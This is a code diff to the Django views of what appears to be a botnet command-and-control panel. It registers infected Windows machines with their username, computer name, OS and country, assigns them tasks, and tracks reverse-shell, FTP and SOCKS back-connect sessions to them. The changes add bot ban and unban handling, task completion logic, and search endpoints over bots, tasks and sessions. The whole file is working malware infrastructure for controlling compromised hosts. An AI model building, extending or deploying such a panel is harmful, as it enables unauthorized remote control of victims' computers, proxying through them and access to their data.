@@ -1,3 +1,5 @@
+import json
+
 import pytz
 from django.shortcuts import HttpResponse, render
 from django.http import JsonResponse
@@ -9,6 +11,7 @@ from .models import Bot, Session, Task, IPBackConnect
 import datetime
 import struct
 import requests
+from django.db.models import Q
 
 
 # ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/
@@ -16,8 +19,27 @@ import requests
 class Subsidiary:
 
     @staticmethod
+    def get_os(bot: Bot):
+        if bot.is_win7:
+            os = 'Windows 7'
+        elif bot.is_win81:
+            os = 'Windows 8.1'
+        elif bot.is_win8:
+            os = 'Windows 8'
+        elif bot.is_win10:
+            os = 'Windows 10 / 11'
+        elif bot.is_server2012:
+            os = 'Windows Server 2012'
+        elif bot.is_server2012r2:
+            os = 'Windows Server 2012 R2'
+        elif bot.is_server2016_19:
+            os = 'Windows Server 2016/2019'
+
+        return os
+
+    @staticmethod
     def get_country(ip: str):
-        if ip == '127.0.0.1':
+        if ip == '127.0.0.1' or ip == 'ip':
             return ''
         country = requests.get(f'http://api.sypexgeo.net/json/{ip}').json()['country']['iso'].lower()
         return country
@@ -238,10 +260,14 @@ class Handlers:
             if msg_type == 1:
 
                 types = {
-                    1: 'ftp', 2: 'reverse shell', 3: 'socks'
+                    1: 'FTP', 2: 'Reverse shell', 3: 'Socks'
                 }
 
-                ip = self.sub.get_bot_ip(request)
+                try:
+                    ip = request.headers['Ip']
+                except Exception as e:
+                    print(e)
+                    ip = '127.0.0.1'
 
                 session = BackConnectMsg.NewConnection()
                 session.ParseFromString(request.body[4:])
@@ -250,7 +276,7 @@ class Handlers:
                 _type = types[session.type]
                 ip_port = str(ip) + ':' + str(session.port)
 
-                new_session = Session(uid=uid, ip_port=ip_port, connection_type=_type)
+                new_session = Session(uid=uid, ip_port=ip_port, connection_type=_type, type1=session.type)
                 new_session.save()
                 return HttpResponse('200')
 
@@ -258,7 +284,10 @@ class Handlers:
                 conn = BackConnectMsg.ConnectionClosed()
                 conn.ParseFromString(request.body[4:])
 
-                session = Session.objects.get(uid=conn.uid.decode('utf-16-le'))
+                uid = conn.uid.decode('utf-16-le')
+                _type = conn.type
+
+                session = Session.objects.get(uid=uid, type1=_type)
                 session.delete()
 
                 return HttpResponse('200')
@@ -269,9 +298,11 @@ class Handlers:
 
     @csrf_exempt
     def stop_conn(self, request):
+        print(request.POST)
         try:
-            _id = request.POST['_id']
-            session = Session.objects.get(uid=_id)
+            _id = request.POST['uid']
+            _type = request.POST['type']
+            session = Session.objects.get(uid=_id, type1=_type)
             session.delete()
             return HttpResponse('200')
 
@@ -291,7 +322,11 @@ class Handlers:
 
                 ip = self.sub.get_bot_ip(request)
 
-                ip = request.headers['Ip']
+                try:
+                    ip = request.headers['Ip']
+                except Exception as e:
+                    print(e)
+                    ip = '127.0.0.1'
 
                 country = self.sub.get_country(ip)
 
@@ -303,12 +338,18 @@ class Handlers:
                 is_x64 = bot.is_x64
                 is_server = bot.is_server
 
+                if is_x64:
+                    x_oc = '64X'
+                else:
+                    x_oc = '32X'
+
                 try:
                     _bot = Bot.objects.get(uid=uid)
+                    return HttpResponse('201')
                 except Exception as e:
                     print(e)
                     _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
-                               is_server=is_server, country=country)
+                               is_server=is_server, country=country, x_oc=x_oc)
 
                 if os_major == 10 and os_minor == 0 and not is_server:
                     _bot.is_win10 = True
@@ -340,7 +381,7 @@ class Handlers:
                 elif _bot.is_win7:
                     task_win = 'win7'
                 elif _bot.is_win10:
-                    task_win = 'win10'
+                    task_win = 'win10_11'
                 elif _bot.is_win8:
                     task_win = 'win8'
                 elif _bot.is_server2016_19:
@@ -351,7 +392,7 @@ class Handlers:
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
                                                                  task.xoc == 'x32_64') and (
                                  task.winos == 'all_win' or task_win in task.winos.split(
-                             ':')) and task.personal is False]
+                             ':')) and task.personal is False and not task.completed]
 
                 for task in tasks:
                     _bot.tasks.add(task)
@@ -383,9 +424,9 @@ class Handlers:
             bot.save()
 
             s = {
-                'ftp': 2,
-                'sock': 3,
-                'shell': 1
+                'FTP': 2,
+                'Socks': 3,
+                'Reverse shell': 1
             }
 
             if len(bot.tasks.all()) == 0:
@@ -415,19 +456,30 @@ class Handlers:
                 _task = Task.objects.get(id=task_id)
                 _task.done += 1
 
+                if _task.completed:
+                    bots = Bot.objects.filter(tasks=_task)
+                    for bot in bots:
+                        bot.tasks.remove(_task)
+
                 if _task.done == _task.repetitions:
                     _task.completed = True
                     _task.save()
                     bots = Bot.objects.filter(tasks=_task)
+                    print(bots, 'task1')
                     for bot in bots:
                         bot.tasks.remove(_task)
                 elif _task.done > _task.repetitions:
                     _task.done -= 1
+                    _task.completed = True
                     _task.save()
                     bots = Bot.objects.filter(tasks=_task)
+                    print(bots, 'task2')
                     for bot in bots:
                         bot.tasks.remove(_task)
                 else:
+                    bot = Bot.objects.get(uid=_task.uid.decode('utf-16-le'))
+                    bot.tasks.remove(_task)
+                    bot.save()
                     _task.save()
                 return HttpResponse('200')
             return HttpResponse('200')
@@ -446,6 +498,8 @@ class Handlers:
         bot = Bot.objects.get(uid=request.POST['uid'])
         bot.is_banned = True
         bot.save()
+        for task in bot.tasks.all():
+            bot.tasks.remove(task)
         return JsonResponse({'v': '200'})
 
     @staticmethod
@@ -453,7 +507,35 @@ class Handlers:
     def unban(request) -> JsonResponse:
         bot = Bot.objects.get(uid=request.POST['uid'])
         bot.is_banned = False
+
+        if bot.is_x64:
+            xoc = 'x64'
+        else:
+            xoc = 'x32'
+
+        if bot.is_win81:
+            task_win = 'win81'
+        elif bot.is_win7:
+            task_win = 'win7'
+        elif bot.is_win10:
+            task_win = 'win10_11'
+        elif bot.is_win8:
+            task_win = 'win8'
+        elif bot.is_server2016_19:
+            task_win = 'serv2016_19'
+        elif bot.is_server2012:
+            task_win = 'serv2012'
+
+        tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
+                                                         task.xoc == 'x32_64') and (
+                         task.winos == 'all_win' or task_win in task.winos.split(
+                     ':')) and task.personal is False and not task.completed]
+
+        for task in tasks:
+            bot.tasks.add(task)
+
         bot.save()
+
         return JsonResponse({'v': '200'})
 
     @staticmethod
@@ -470,13 +552,13 @@ class Handlers:
         print(wins)
 
         s = {
-            'win7': Bot.objects.filter(is_win7=True),
-            'win8': Bot.objects.filter(is_win8=True),
-            'win81': Bot.objects.filter(is_win81=True),
-            'win10_11': Bot.objects.filter(is_win10=True),
-            'serv2016_19': Bot.objects.filter(is_server2016_19=True),
-            'serv2012': Bot.objects.filter(is_server2012=True),
-            'all_win': Bot.objects.all()
+            'win7': Bot.objects.filter(is_win7=True).filter(is_banned=False),
+            'win8': Bot.objects.filter(is_win8=True).filter(is_banned=False),
+            'win81': Bot.objects.filter(is_win81=True).filter(is_banned=False),
+            'win10_11': Bot.objects.filter(is_win10=True).filter(is_banned=False),
+            'serv2016_19': Bot.objects.filter(is_server2016_19=True).filter(is_banned=False),
+            'serv2012': Bot.objects.filter(is_server2012=True).filter(is_banned=False),
+            'all_win': Bot.objects.filter(is_banned=False)
         }
 
         print(request.POST)
@@ -523,27 +605,31 @@ class Handlers:
         _type = request.POST['type']
         name = request.POST['name']
 
-        bot = Bot.objects.get(uid=uid)
+        _bot = Bot.objects.get(uid=uid)
 
-        if bot.is_win81:
+        if _bot.is_win81:
             task_win = 'win81'
-        elif bot.is_win7:
+        elif _bot.is_win7:
             task_win = 'win7'
-        elif bot.is_win10:
+        elif _bot.is_win10:
             task_win = 'win10'
-        elif bot.is_win8:
+        elif _bot.is_win8:
             task_win = 'win8'
+        elif _bot.is_server2016_19:
+            task_win = 'serv2016_19'
+        elif _bot.is_server2012:
+            task_win = 'serv2012'
 
-        if bot.is_x64:
+        if _bot.is_x64:
             xoc = 'x64'
         else:
             xoc = 'x32'
 
-        task = Task(name=name, personal=True, country=bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc,
+        task = Task(name=name, personal=True, country=_bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc,
                     type1=_type)
         task.save()
 
-        bot.tasks.add(task)
+        _bot.tasks.add(task)
 
         return JsonResponse({'v': '200'})
 
@@ -554,5 +640,56 @@ class Handlers:
         task = Task.objects.get(id=_id)
         task.delete()
         return JsonResponse({'v': '200'})
+
+
+    @csrf_exempt
+    def search(self, request):
+        q = request.POST['q']
+        bots = Bot.objects.filter(
+            Q(uid__icontains=q) | Q(country__icontains=q) | Q(x_oc__icontains=q) | Q(comment__icontains=q)
+        )
+
+        _bots = []
+
+        for bot in bots:
+            _bots.append([bot.ip, bot.country, bot.uid, self.sub.get_os(bot), bot.x_oc, bot.is_online, bot.is_banned,
+                          bot.comment])
+
+        print(_bots)
+
+        return HttpResponse(json.dumps(_bots))
+
+    @staticmethod
+    @csrf_exempt
+    def search_task(request):
+        q = request.POST['q']
+
+        tasks = Task.objects.filter(
+            Q(name__icontains=q)
+        )
+
+        _tasks = []
+
+        for task in tasks:
+            _tasks.append([task.name, task.type1, task.country, task.done, task.repetitions, task.completed, task.winos,
+                           task.id])
+
+        return HttpResponse(json.dumps(_tasks))
+
+    @staticmethod
+    @csrf_exempt
+    def search_session(request):
+        q = request.POST['q']
+
+        sessions = Session.objects.filter(
+            Q(uid__icontains=q)
+        )
+
+        _sessions = []
+
+        for session in sessions:
+            _sessions.append([session.uid, session.ip_port, session.connection_type, session.is_active, session.type1])
+
+        return HttpResponse(json.dumps(_sessions))
 
 # ОБРАБОТЧИКИ -------------------------------------------- /
